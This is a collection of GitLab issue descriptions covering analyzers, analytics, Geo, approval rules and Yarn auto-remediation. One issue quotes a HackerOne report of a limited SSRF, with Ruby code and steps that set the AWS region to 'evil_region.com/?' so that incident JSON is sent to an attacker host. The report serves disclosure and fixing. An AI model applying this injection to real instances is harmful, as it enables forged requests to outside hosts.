"Restrict access by IP address" is currently implemented as a comma separated list. This field can be implemented with the ["Token Selector"](https://gitlab.com/gitlab-org/gitlab-ui/-/merge_requests/1460) component to improve the UI/UX.

The "Restrict membership by email" field is also planned to be implemented with the ["Token Selector"](https://gitlab.com/gitlab-org/gitlab-ui/-/merge_requests/1460) component. See https://gitlab.com/gitlab-org/gitlab/-/issues/220567


### Availability & Testing

This is a UI change that should not affect GitLab.com availability.

Updates to existing tests that use ip address field would probably be required.

A manual test in multiple browsers for the Token Selector component will surely help gaining confidence.

title: Follow-up from "Geo - Does not sync files on Object Storage when syncing object storage is enabled, but the Object Storage is disabled for data type"
description:
The following discussion from !33561 should be addressed:

- [ ] @mkozono started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33561#note_356652195):  (+2 comments)

    > suggestion: The original meaning of "missing on primary" was a special case where the DB records are all there, but the file itself could not be found by the primary. https://gitlab.com/gitlab-org/gitlab/blob/master/ee/lib/gitlab/geo/replication/base_transfer.rb#L221 This error cannot be known until the transfer is attempted. The secondary reacts by marking it "synced" but also "missing on primary".
    > 
    > It appears "missing on primary" began to be reused at some point, but I believe that is a bug. I think we need a regular error `skip_transfer_error` for this.

title: Update nodejs-scan sast analyzer to use njsscan v0.1.5
description:
### Problem to solve

We are using the rules from an external dependency for our [nodejs-scan analyzer](https://gitlab.com/gitlab-org/security-products/analyzers/nodejs-scan). The current release is v3.7 of this tool. [v4.2](https://github.com/ajinabraham/nodejsscan/releases/tag/v4.2) shipped August 26, 2020, and it is a full rewrite of the tool to utilize semgrep. We should update the analyzer to use the underlying tool rather than only using its tools.

**A note on nodejs-scan**
: nodejs-scan is a project that includes a web front-end, which we do not need. The nodejs-scan project depends on another project by the same user, [njsscan](https://github.com/ajinabraham/njsscan), which is the project the rewrite of this analyzer will want to pull from. The latest version of njsscan is at [v0.14.0](https://github.com/ajinabraham/njsscan/commit/d080ef6d27063d1b86344141bc798084a1b6eb67#diff-86cd2f078cae4e1bf188157d219bedfdR7).

### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

Replace existing nodejs-scan analyzer with a new analyzer that fully utilizes the underlying OSS project to do detection of potential vulnerabilities.

### Implementation Plan
- [x] Update Dockerfile to pull v0.14.0 of njsscan
- [x] Rewrite the analyzer to wrap around njsscan. While we're at it, we should rewrite the analyzer to use an `analyze` function rather than `run`. 
- [x] Write new unit tests
- [x] Create new QA test projects
- [x] Remove old nodejs-scan QA test projects

### Documentation
- Add new rows to the [supported languages for SAST](https://docs.gitlab.com/ee/user/application_security/sast/#supported-languages-and-frameworks) doc section
- Update [analyzer data table](https://docs.gitlab.com/ee/user/application_security/sast/analyzers.html#analyzers-data) with new capabilities

### Release notes
Release notes MR - https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/64549

title: [VSA] Refactor project-level feature to use group-level code
description:
### Problem to solve

There are 2 implementations of the Value Stream Analytics (VSA) feature:

1. Group-level
1. Project-level

In recent months these 2 implementations have begun to diverge substantially, because we have invested in refactoring ([example](https://gitlab.com/gitlab-org/gitlab/merge_requests/16775/diffs#6c1aff793e288e33581de3369f333b8aa888428f_0_38)) and enhancing the group-level implementation, but not the project-level.  Basically we have 2 different features now.  That is a problem because:

- [Different values displayed between the 2 features](https://gitlab.com/gitlab-org/gitlab/-/issues/213029).
- Increased cost of maintaining 2 separate features.
- Unable to offer cool group-level features (like custom stages) at the project level (per https://gitlab.com/gitlab-org/gitlab/-/issues/30079#note_357374957)

### Further details

The ~"group::analytics" [has discussed](https://gitlab.com/gitlab-org/gitlab/-/issues/30079#note_315668874) whether to 1) move FOSS functionality to the group-level and delete the project-level (#30079) or 2) refactor the project-level to use the new group-level code (this issue).  It has been estimated that the [effort would be about the same](https://gitlab.com/gitlab-org/gitlab/-/issues/213029#note_316012604) between these approaches.

### Proposal

Refactor project-level VSA to use the group-level code:

- [ ] [Migrate EE code into a core module with EE specific extensions](https://gitlab.com/gitlab-org/gitlab/-/issues/213358) ~frontend 
- [x] [Migrate project-level VSA to use group-level backend](https://gitlab.com/gitlab-org/gitlab/-/issues/213029) ~backend 
- [x] [Eliminate un-used Cycle Analytics code for legacy version](https://gitlab.com/gitlab-org/gitlab/-/issues/292730) ~backend 

Note: This is a tracking issue, not an implementation issue.

### Implementation recommendations

- See the thread starting here: https://gitlab.com/gitlab-org/gitlab/-/issues/30079#note_356967059

title: Status page SSRF [limited blind]
description:
**[HackerOne report #880019](https://hackerone.com/reports/880019)** by `anyday` on 2020-05-21, assigned to @vdesousa:

Hello,

The `status page` feautre, accepts `aws S3 region` parameter, without validating it.

```ruby  
    /ee/app/models/status_page/project_setting.rb  
...  
    validates :project, :aws_region, :encrypted_aws_secret_key,  
              presence: true  
...  
```

Later the `status page service` calls the Aws::S3::Client.

```ruby  
    /ee/app/services/status_page/publish_base_service.rb  
...  
def upload(key, json)  
  return error_limit_exceeded(key) if limit_exceeded?(json)

  content = json.to_json  
  storage_client.upload_object(key, content)

  success(object_key: key)  
end  
...  
```

```ruby  
    /ee/lib/status_page/storage/s3_client.rb  
...  
def upload_object(key, content)  
  wrap_errors(key: key) do  
    client.put_object(bucket: bucket_name, key: key, body: content)  
  end

  true  
end  
...  
```

Usually this results in the following request:

`PUT https://s3.region.amazonaws.com/bucket_name/key HTTP/1.1`

If you pass the region `evil_region.com/?`, the following request is issued:

```ruby  
require 'aws-sdk'

s3 = Aws::S3::Client.new(  
    region: "evil_region.com/?",  
    access_key_id: "11111111111111111111",  
    secret_access_key: "1111111111111111111111111111111111111111",  
);

s3.put_object(bucket: "bucket.name", key: "key", body: "content")  
```

`PUT https://s3.evil_region.com/bucket.name/key HTTP/1.1`

As you can see, limited SSRF is possible.

SIDE NOTE: If bucket name is 'aaaaa', `Aws::S3::Client` will use 'Virtual-hosted–style' naming, but if bucket name is 'aaa_aaa' or  'aaa.aaaa', it will use 'Path-style' naming.

Limitations:  
- Requires valid matching certificate since request is over https (If testing with self signed cert, add CA to /opt/gitlab/embedded/ssl/certs/cacert.pem)  
- Only PUT and DELETE methods  
- Limited path or subdomain control using `bucket name` (which is validated with `\A[a-z0-9][a-z0-9\-.]*\z`)

Steps to reproduce:

1. Create a project, go to settings -> operations -> Status page, Set: 

```  
S3 Bucket name = bucket.name  
AWS region = evil_region.com/?  
AWS access key ID = 11111111111111111111  
AWS Secret access key = 1111111111111111111111111111111111111111  
```  
2. Go to project issues, create new issue. This will cause the following request:

`PUT https://s3.evil_region.com/mybucket.2/data/incident/9.json`

The server will need to respond with valid 's3.evil_region.com' certificate.

Video POC:  
[REDACTED]

## Impact

Limited SSRF

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

[REDACTED]

title: Managed Licenses API: Change `blacklisted` to `denied` and `approved` to `allowed`
description:
## Summary

The terms used in the API contribute to a sub-conscious implicit bias and do not align with the terms used in the License Compliance page. I would like to propose that we update the API to change `blacklisted` to `denied` and `approved` to `allowed` to align with classifications defined in license compliance page. 

API documentation:

* https://docs.gitlab.com/ee/api/managed_licenses.html#list-managed-licenses

Related to:

* https://gitlab.com/gitlab-org/gitlab/-/issues/38271
* https://gitlab.com/gitlab-org/gitlab/-/issues/14061
* https://gitlab.com/gitlab-org/gitlab/-/issues/33868

## Improvements

Deprecate the usage of the `blacklisted` in favor of `denied`.
Deprecate the usage of the `approved` in favor of `allowed`.

## Risks

Existing API clients will need to use the new terms. An attempt can be made to map the old terms to the new ones to maintain backwards compatibiilty.

## Involved components

* https://gitlab.com/gitlab-org/gitlab/-/blob/600e0af5c19a2a9d4beb86cdd4680bc7aa9cd22b/ee/lib/api/managed_licenses.rb#L62
* https://gitlab.com/gitlab-org/gitlab/-/blob/600e0af5c19a2a9d4beb86cdd4680bc7aa9cd22b/ee/lib/api/managed_licenses.rb#L89
* https://gitlab.com/gitlab-org/gitlab/-/blob/600e0af5c19a2a9d4beb86cdd4680bc7aa9cd22b/ee/app/assets/javascripts/vue_shared/license_compliance/constants.js#L10-11

## Optional: Intended side effects

Remove harmful language and increase consistency between API and UI.

## Optional: Missing test coverage

## Implementation Plan - Backend

* [ ] Remove usage of [LEGACY_CLASSIFICATION_STATUS](https://gitlab.com/gitlab-org/gitlab/-/blob/6dfb81530a1e43eb9f08bf7c1a1c7c9bb76dbb55/ee/app/models/software_license_policy.rb#L9-12).
* [ ] Update the #create endpoint of the API to refer to the new terms [source](https://gitlab.com/gitlab-org/gitlab/-/blob/6dfb81530a1e43eb9f08bf7c1a1c7c9bb76dbb55/ee/lib/api/managed_licenses.rb#L62-63).
* [ ] Update #update action of API to refer to new terms [source](https://gitlab.com/gitlab-org/gitlab/-/blob/6dfb81530a1e43eb9f08bf7c1a1c7c9bb76dbb55/ee/lib/api/managed_licenses.rb#L89-90)
* [ ] Update API endpoints to map from the old terms to the new terms.
* [ ] Replace usages of `approval_status` with `classification` (stretch goal)

title: Address StagesController < PipelinesController inheritance
description:
## Overview

Right now the `StagesController` inherits directly from the `PipelinesController`. This can be undesirable as the `PipelinesController` has a set of actions and operations that are considered `final` which are served by the set of endpoints described by: `/pipelines(/:id)(.format)`. When we inherit from PipelinesController, a badly written route can expose these actions inadvertently in a different context, like: `/pipelines/stages/...`.

## Proposal

If our intent is to have a controller that we can inherit from, we could create a base or abstract controller like: `Projects::(Base|Abstract)PipelinesController` where `PipelinesController/Stages/TestsControllers` and others could inherit from.

Overall, we follow a model wherein there is a `Projects::ApplicationController` that is serving as an abstract controller. I would assume that we could follow the same pattern for `Projects::Pipelines::ApplicationController` and have it be a top-level abstract controller for a given set of `Pipeline` functionalities that are common, like finding `pipeline_id`.

For example:
```
Projects::PipelinesController < Projects::ApplicationController
# a top-level controller for handling `/pipelines(/:id)(.format)`

Projects::Pipelines::ApplicationController < Projects::ApplicationController
# an abstract controller for all subpaths of a `/pipelines/:pipeline_id`

Projects::Pipelines::TestsController < Projects::Pipelines::ApplicationController
# `/pipelines/:pipeline_id/tests(/:id)(.format)`

Projects::Pipelines::StagesController < Projects::Pipelines::ApplicationController
# `/pipelines/:pipeline_id/stages(/:id)(.format)`
```

Ensure that this MR is reviewed by a reviewer and a maintainer in ~"group::continuous integration" .

## Motivation

The following discussion from !33895 should be addressed:

- [ ] @morefice started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33895#note_356373888):  (+3 comments)

> OMG. I saw that. This is really bad idea to inherit `PipelinesController` that implements another actions.
 We are leaking a number of actions that are unrelated to a given controller.


:wave: @rickywiens could you help me identify/prioritize who/when should we fix this controller ?

title: Document how Codeowners works for subgroups
description:
### Problem to solve

Many users including GitLab use subgroups to organize members. Users often get confused about how to get subgroups to work with codeowners

Proposal:

> Yeah, I think the documentation is actually in a good place overall after taking another look. title: Technical Discovery: Standard/JSON Format for SAST Config UI
description:
## Problem to Solve
We need to decide a standard JSON format for our SAST config UI to render required fields in the config UI. 

### Details
We need to decide a standard that will be extensible to other types of scanners like secrets, and DAST. This will be the form that the [parser](https://gitlab.com/gitlab-org/gitlab/-/issues/220575) uses when reading CI files to render the [configuration UI](https://gitlab.com/gitlab-org/gitlab/-/issues/220577#note_356880596). 

There is a community-supported schema we might be able to use http://json.schemastore.org/gitlab-ci.

Field support: 
* scan type
* version? 
* variable name
* variable value
* UI type (text field, dropdown, etc)
* available variable values (in the case of an enum/dropdown)
* variable description
* variable doc link
* variable default value
* variable required? 



### Other Links
There are a few other projects in flight that may also be looking for CI standards
* [WebIDE yml validation](https://gitlab.com/gitlab-org/gitlab/-/issues/218473)
* [WebIDE realtime .gitlab-ci.yml hints/suggestions](https://gitlab.com/gitlab-org/gitlab/-/issues/218472)
* [Error messages in CI lint](https://gitlab.com/gitlab-org/gitlab/-/issues/216444)

### GraphQL query

A GraphQL query approximately like the following will return the schema:

```graphql
{
  ciConfig(scanType: "sast") {
    configuration
  }
}
```

To be defined in another issue (cc @ssarka).

Saikat: GraphQL work is addressed in this [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/223757).

### Form submission/GraphQL Mutation

Mutation payload will be something like:

```
{
  "SECURE_ANALYZERS_PREFIX": "foo",
  "SAST_ANALYZER_IMAGE_TAG": "bar"
  ...
}
```

Should either return new MR URL for frontend to redirect to (if using GraphQL), or a 302 response (if using normal Rails form) (cc @ssarka)

Saikat: this is already addressed in this [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/223878).

### JSON format

Based on the discussion below, the following is a possible JSON format. Possible values of `type` are `string`, `text` (i.e., multi-line strings), `boolean`, `number`, and `list`. Config UI components may be rendered using this JSON. We may change the JSON based on requirement in the future.

```json
[
  {
    "scan_types": ["sast", "secret_detection", "dependency_scanning"],
    "analyzer": "all",
    "doc_link": "...",
    "variable_name" : "SECURE_ANALYZERS_PREFIX",
    "current_value" : null,
    "default_value" : "registry.gitlab.com/gitlab-org/security-products/analyzers",
    "short_name" : "Image prefix",
    "description" : "Overrides the name of the Docker registry providing the default images",
    "available_values": [],
    "type": "string"
  },
  {
    "scan_types": ["sast"],
    "analyzer": "all",
    "doc_link": "...",
    "variable_name" : "SAST_ANALYZER_IMAGE_TAG",
    "current_value" : null,
    "default_value" : "2",
    "short_name" : "Image tag",
    "description" : "Overrides the Docker tag of the default images",
    "available_values": [],
    "type": "string"
  },
  {
    "scan_types": ["sast"],
    "analyzer": "kubesec",
    "doc_link": "...",
    "variable_name" : "SCAN_KUBERNETES_MANIFESTS",
    "current_value" : null,
    "default_value" : "false",
    "short_name" : "",
    "description" : "",
    "type": "boolean"
  }
]
```

<details>
<summary>Written in (approximate) TypeScript notation</summary>

```typescript
type SchemaItemGeneric<T> = {
  scan_types: "sast" | "secret_detection" | "dependency_scanning";
  analyzer: "all" | "kubesec" | "bandit" | "spotbugs" | "flawfinder" | "etc...";
  doc_link: string;
  variable_name : string;
  current_value : T;
  default_value : T;
  short_name : string;
  description : string;
  available_values: T[];
  type: T;
};

type SchemaItem = SchemaItemGeneric<string | text | number | boolean>

type Schema = Array<SchemaItem>;
```

</details>

<details>
<summary>Changes since the last version</summary>

- `scan_type: string` -> `scan_types: string[]`
  - It may be that the frontend wants to indicate whether a particular field affects other scanners; if so, it would want to say which ones.
- inline `configuration` field to top level object
  - The previous `configuration` array was a holdover from the initial iteration.
- `ui_type` -> `type`
- Add `text` as possible type, for multi-line strings. See https://gitlab.com/gitlab-org/gitlab/-/issues/216635#note_366698167.

</details>

## Unanswered questions

- Can a variable be assigned to more than one analyzer, but not all? cc @ssarka 

Saikat: Except for general settings variables(e.g. SECURE_ANALYZERS_PREFIX), each variable is associated with only one analyzer. This is the [source of information](https://docs.gitlab.com/ee/user/application_security/sast/#customizing-the-sast-settings).

## Comments

- In future, we might want to make the `short_name`/`description fields` translatable. Something for a later iteration (%"13.3"+).
- `current_value` won't be used in %13.2, since it can only be populated with parsed CI value(s) (%"13.3"+).

title: Parse SAST Config file for Configuration UI
description:
## Problem to Solve
We need to be able to parse our gitlab-ci.yml files to read SAST configuration to display in the new configuration UI. 

### Details
* Parse CI files to pull out variables:
  * .gitlab-ci.yml
  * SAST.gitlab-ci.yml
* Translate Yaml into [JSON object](https://gitlab.com/gitlab-org/gitlab/-/issues/220576) that meets the standard we choose in https://gitlab.com/gitlab-org/gitlab/-/issues/220576#note_356880597


### Other links
Note we already have a few things that parse Yaml files:
* [Validate gitlab-ci files via API](https://docs.gitlab.com/ee/api/lint.html)
* [CI File lint tool](https://gitlab.com/gitlab-org/gitlab/-/ci/lint)

### Implementation Plan
- [ ] Use yaml [processor](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/yaml_processor.rb#L6) to parse SAST.gitlab-ci.yml and .gitlab-ci.yml
- [ ] Populate the `current` values in the JSON read from this [file](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/validators/json_schemas/security_ci_configuration_schemas/sast_ui_schema.json#L1).
- [ ] Modify the GraphQL [query](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/graphql/resolvers/ci_configuration/sast_resolver.rb#L13) to support parsing of .gitlab-ci.yml and SAST.gitlab-ci.yml

title: Go get fails with a 500 for deep nested projects
description:
When `go get` fetches from a GitLab URL, it appends a `?go-get=1` parameter to the URL.

This is then used to redirect `go get` to the repository it should clone.

Unfortunately, this is failing for deep nested projects. 

For example: 

The command `go get gitlab.com/group/sub-group/project/cmd/x` will issue a request to `https://gitlab.com/group/sub-group/project/cmd/x?go-get=1`. 

This should redirect `go get` to `https://gitlab.com/group/sub-group/project/`, and this works as expected for projects nested directly off the root namespace.

However, for deep nested projects, it does not work correctly, in that the client is redirected to the second level nesting, which in this case will be a group. 

![image](/uploads/f78b709f3e1204c987b1fb03f85cdef4/image.png)

`go get` will then attempt to perform a `git clone` of `https://gitlab.com/group/sub-group`, which is a group and cannot be cloned.

From the client side, this will error, for example:

```
go get -v https://gitlab.com/gitlab-com/gl-infra/cloudflare
package https:/gitlab.com/gitlab-com/gl-infra/cloudflare: https:/gitlab.com/gitlab-com/gl-infra/cloudflare: invalid import path: malformed import path "https:/gitlab.com/gitlab-com/gl-infra/cloudflare": invalid char ':'
```

title: Instrument usage of overridden approval rules for self-managed instances
description:
### Problem to solve

https://gitlab.com/gitlab-org/gitlab/-/issues/220529 will provide us the usage for approval rules, however, we still need to know usage for **overridden** approval rules for merge requests (when the `Can override approvals in merge request` option is ticked in repo settings).

### Further details

We should be able to distinguish between the two types by looking at the `ApprovalMergeRequestRuleSource` for an `ApprovalMergeRequestRule`

### Proposal

From https://gitlab.com/gitlab-org/gitlab/-/issues/220541#note_358825262:

> First, we need to check which MRs have project approval rules (from `approval_project_rules`) that are not a source rule of merge request approval rules (from `approval_merge_request_rules`). We need to only count the MRs that are from `projects` with `disable_overriding_approvers_per_merge_request` as `false`. These are MRs with deleted approval rules.

Next, we need to check which MRs have merge request approval rules that have different `name`, `approvals_required`, `users`, or `groups` from their source project approval rule. Like the first list, we only need to count the MRs that are from `projects` with `disable_overriding_approvers_per_merge_request` as `false`. These are the MRs with edited approval rules.

We can then combine these 2 lists and distinct count by `merge_request_id`.

### Links / references

title: Drop support of Docker in Docker (DinD) mode for SAST and Dependency Scanning
description:
### Problem to solve

We've already deprecated the DinD mode and switched to non-DinD by default. We now need to officially drop support for this mode. Also, we should stop testing the DinD mode to simply QA for SAST and Dependency Scanning.

### Intended users

* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)
* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)

### User experience goal

The user should no longer be able to enable Docker in Docker mode for SAST and Dependency Scanning features.

### Proposal

- drop related code in relevant places (common, analyzers, etc.)
- remove mention of Dind mode in the documentation see [documentation](#documentation)

### Implementation Plan

- Update CI configuration templates https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41260
  - [x] Remove DinD configuration from [Dependency-Scanning.gitlab-ci.yml](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Security/Dependency-Scanning.gitlab-ci.yml)
  - [x] Remove DinD configuration from [SAST.gitlab-ci.yml](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Security/SAST.gitlab-ci.yml)
- Update CI templates used for QA
  - [x] Remove QA for Dependency Scanning in DinD mode https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/147
  - [x] Remove QA for SAST in DinD mode https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/148
- Update docs
  - [x] Remove configuring [docker orchestrator](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#configuring-docker-in-docker-orchestrator) for DS https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40631
  - [x] Remove mentions about `DS_DISABLE_DIND` from [docs](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/) https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40631
  - [x] Remove configuring [docker orchestrator](https://docs.gitlab.com/ee/user/application_security/sast/#docker-in-docker-orchestrator) for SAST https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40991
  - [x] Remove mentions about `SAST_DISABLE_DIND` from [docs](https://docs.gitlab.com/ee/user/application_security/sast/) https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40991

Not covered by this issue:

- Update test projects: covered by https://gitlab.com/gitlab-org/gitlab/-/issues/250333
  - Merge the `no_dind-FREEZE` branches into `master`
  - Rebase `*-FREEZE` branches
  - Rename `no_dind-*` branches, if any
  - Remove `SAST_DISABLE_DIND` from the analyzer template ([example](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/628e9b2d0516e4b071a4560fab8c11b9055e84b4/includes-dev/analyzer.yml#L249))
- Remove orchestrator package from common analyzer: covered by https://gitlab.com/gitlab-org/gitlab/-/issues/225875

### Further details

<!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. -->

### Permissions and Security

No change.

### Documentation

* remove [SAST DinD documentation](https://docs.gitlab.com/ee/user/application_security/sast/index.html#enabling-docker-in-docker), related env variables and any other related section.
* remove [Dependency Scanning DinD documentation](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#enabling-docker-in-docker), related env variables and any other related section.

See [implementation plan](#implementation-plan)

### Availability & Testing

DinD for SAST and Dependency Scanning are no longer tested. The test projects are used to test the no-DinD setup where each analyzer runs in its own CI job. In particular, the `master` branch of all test projects is used to check the default no-DinD setup.

### What does success look like, and how can we measure that?

SAST and Dependency Scanning no longer support DinD mode.

### What is the type of buyer?

~"GitLab Ultimate" 

### Is this a cross-stage feature?

This impacts:

* ~"group::composition analysis"
* ~"group::static analysis"

### Links / references

Release post for planned removal: https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/52499/diffs

title: Instrument use of approval rules for self-managed instances
description:
### Problem to solve

~"group::source code" is working to refine and update approval rules so it works well in conjuction with the rest of the group features, however, we don't have any usage data for self-managed customers.

### Proposal

Instrument the use of approval rules for self-managed by adding it to usage ping.

1. Number of project approval rules: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/36316
1. Number of eligible approvers (**users only, not groups**) per rule
1. Number of required approvals per rule
1. If `Target branch` rule option is not the default (`Any branch`): https://gitlab.com/gitlab-org/gitlab/-/merge_requests/36316

### Further details

We currently have this data for gitlab.com users in the `analytics.gitlab_dotcom_merge_requests_xf` source from the data wareshouse. We look at MRs where `approvals_before_merge > 0`.

### Possible follow-ups

Perhaps a pairing metric, that can provide some additional insight if we don't count group members is the following:

1. Number of approval rules with only users
1. Number of approval rules with only groups
1. Number of approval rules with both users and groups

### Permissions and Security

### Links / references

* https://app.periscopedata.com/app/gitlab/526749/Create---Code-Review-category-dashboard

title: Follow-up: Refactor controller to make code clearer and remove unused variables
description:
As per @mwoolf's [suggestion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33305#note_356128534):

---

**suggestion:** There are two *very* similarly named objects being exposed to the view here `@events` and `@table_events` and it's not immediately clear what the difference between them is but both are used in the view, so must be necessary.

```ruby
events: @table_events.to_json,
is_last_page: @events.last_page?.to_json
```

For readability, I would suggest naming the events that are passed to the Vue application `events`. The intention behind `events: @events.json` is very clear IMO.

Additionally, consider refactoring the controller so that `is_last_page: @events.last_page?.to_json` becomes `is_last_page: @is_last_page.to_json` or something similar.

```ruby
events = Gitlab::Audit::Events::Preloader.preload!(
  AuditLogFinder
    .new(level: level, params: audit_logs_params)
    .execute
    .page(params[:page])
    .without_count
)
@is_last_page = events.last_page?
@events = AuditEventSerializer.new.represent(events)
```

You could then refactor the view:

```ruby
events: @events.to_json,
is_last_page: @is_last_page.to_json,
```

I make no guarantees about how well this will play with Vue, as there may be things I've missed but hopefully, the intent behind my comment is clear :smile:

---

We should change the following locations:

* `ee/app/controllers/admin/audit_logs_controller.rb:14`
* `ee/app/views/admin/audit_logs/index.html.haml:4`
* `ee/app/controllers/groups/audit_events_controller.rb:23`
* `ee/app/views/groups/audit_events/index.html.haml:7`
* `ee/app/controllers/projects/audit_events_controller.rb:23`
* `ee/app/views/projects/audit_events/index.html.haml:7`

description:

## Problem to solve

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

As a user of the GitLab [jenkins wrapper MVC](https://gitlab.com/gitlab-org/gitlab/-/issues/208848), I want the supported jenkins versions to be documented so that I can know if there is a support jenkins-file runner version compatible with my jenkins installation.

With the jenkinsfile-runner version `1.0-beta-12` now supporting Jenkins 2.222.1 LTS, we need to update our jenkins wrapper tool's [README](https://gitlab.com/gitlab-org/jfr-container-builder/-/blob/master/README.md).

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)

- mention that latest Jenkins 2.222.1 LTS is supported by `1.0-beta-12`; **OR**

title: Create runbook-style documentation for a failover with two sites, single-node Geo, omnibus-managed database
description:
Currently, the DR documentation is quite "jumpy". It would be great to provide a clear linear process for a simple failover, that includes all steps.

### Proposal

Create/refactor documentation with the following structure:

* Failover with two sites, single-node Geo, omnibus-managed database
  * Preflight checks (listes)
  * Make primary unavailable
  * Promote secondary site to primary
  * Optional: Demote primary to secondary and add to new primary


This may not require that much work but ideally should focus on simplicity.

title: Setup controller and routing for group MR activity report page
description:
Related Issue: https://gitlab.com/gitlab-org/gitlab/-/issues/217545

### High level overview

1. Create a new namespace within global `EE::Analytics` namesapce: `Reports` (EE only for now, require `read_group_activity_analytics` permission for now)
    - Note: there might be FOSS reports in the future. MR activity is an EE feature at the moment.
2. Setup a route and a basic controller (`Analytics::Reports::PagesController`):  `https://gitlab.com/-/analytics/report_pages/#/:report_id`
    - Put the controller behind a feature flag: `report_pages_#{report_id}`
3. Provide a controller action `show` that responds with `html`.
4. Implement API endpoint for getting the chart configuration: `API::Reports::Chart`
    - `/api/v4/analytics/reports/:report_id/chart`
    - Return the dummy payload defined in: `Chart configuration object`
5. Implement API endpoints for getting the series data: `API::Reports::Series` 
    - `/api/v4/analytics/reports/:report_id/chart/:series_id`
    - Return the dummy payload defined in: `Example series API payload`

#### Example YAML definition (just for context)

```yaml
recent_merge_requests_by_group:
  title: Recent Issues (90 days)
  chart:
    type: bar
    series:
      - id: open_merge_requests
        title: Merge Requests
        data_retrieval: Metrics::InsightsQuery
        data_retrieval_options: 
          issuable_type: merge_request 
          issuable_state: opened 
          group_by: week 
          period_limit: 12
```
#### Chart configuration object

This config will be exposed to the FE via HTML data attributes (on the first request). This is a subset of the YAML file. Data retrieval options are not required on the FE since we have the `id` attribute for the series.

```js
{ 
  "id": "recent_merge_requests_by_group",
  "title": "Recent Issues (90 days)",
  "chart": {
    "type": "bar",
    "series": [
      {
        "id": "open_merge_requests",
        "title": "Merge requests"
      }
    ]
  }
}
```

#### Example series API payload

- `/api/v4/analytics/reports/:report_id/chart/:series_id`
- With parameters: `/api/v4/analytics/reports/recent_merge_requests_by_group/chart/open_merge_requests`


```js
// Same as Insights endpoint
{
  "labels": [
    "label1",
    "label2",
    "label3"
  ],
  "datasets": [
    {
       "label": "Series 1",
       "data": [
         1,
         2,
         3
       ]
    }
  ]
}
```

title: Auto-remediation has no diff for yarn.lock
description:
### Summary When processing a Yarn project, Auto-Remediation for Dependency Scanning doesn't include changes to `yarn.lock`, even though these changes are the remediation itself. Because of that, a remediation is not generated unless there's a change to `package.json`, even if this change isn't relevant. In any case, there's no diff for `yarn.lock`, and the remediation is invalid.

See initial bug report While trying out the suggested solutions feature as per the docs: https://docs.gitlab.com/ee/user/application_security/#solutions-for-vulnerabilities-auto-remediation - one of customers faced an issue with the recommended solution for the detected vulnerability ```Improper Input Validation in minimist``` The solution is to just re-order the dependencies - which didn't solved the vulnerability: ``` --- a/package.json +++ b/package.json @@ -17,11 +17,11 @@ }, "dependencies": { + "bootstrap-select": "1.13.6", "handlebars": "^4.1.2" - "bootstrap-select": "1.13.6", "saml2-js": "1.6.0" }, "devDependencies": { ``` Just wondering if this feature is working as expected as mentioned on the docs or else it's still in the early stages. Tried to replicate the issue and the recommended solution shows a similar patter for this [vulnerability](https://gitlab.com/s_shaik/auto_remidiation/-/security/vulnerabilities/2117775) Any insights on this would be super helpful. ZD: https://gitlab.zendesk.com/agent/tickets/158755 (Internal)

### Further details Auto-remediation for Yarn is implemented in the [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium) project. It relies on the `yarn` CLI to update `package.json` and `yarn.lock`, respectively the editable dependency file and the generated lock file. `yarn` might update `package.json` even thought the dependencies haven't changed. It particular, it might reformat the JSON document, reorder the dependencies, or add an EOL character at the end of the files. Such changes are irrelevant but are nevertheless included in the remediation diff. `yarn` also updates `yarn.lock`, but for some reason this is not included in the remediation diff. This is the main problem since `yarn.lock` needs to be updated in order to remediate the vulnerability. Since `yarn.lock` is ignored when generating the diff, we get no diff when `package.json` is unchanged, thus no remediation. Also, we get an irrelevant diff when `yarn` simply reformats `package.json`. ### Steps to reproduce 1. Import https://gitlab.com/enriquesantosblanco/dependency-vulnerability-comparison-yarn 1. Create MR that adds empty space to package.json and merge it once pipeline is passing. 1. Go to security dashboard and find `Modification of Assumed-Immutable Data (MAID) in lodash` 1. Create remediations for this vulnerability See https://gitlab.com/gitlab-org/gitlab/-/issues/220487#note_406058352 ### Example Project ### What is the current *bug* behavior? The vulnerability has a remediation where only `package.json` is reformatted. This doesn't solve the vulnerability. ### What is the expected *correct* behavior? The remediation updates `yarn.lock`. Also, ideally the remediation doesn't update `package.json` with changes that are not relevant to the remediation. ### Relevant logs and/or screenshots ### Possible fixes - Figure out why [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium) doesn't include 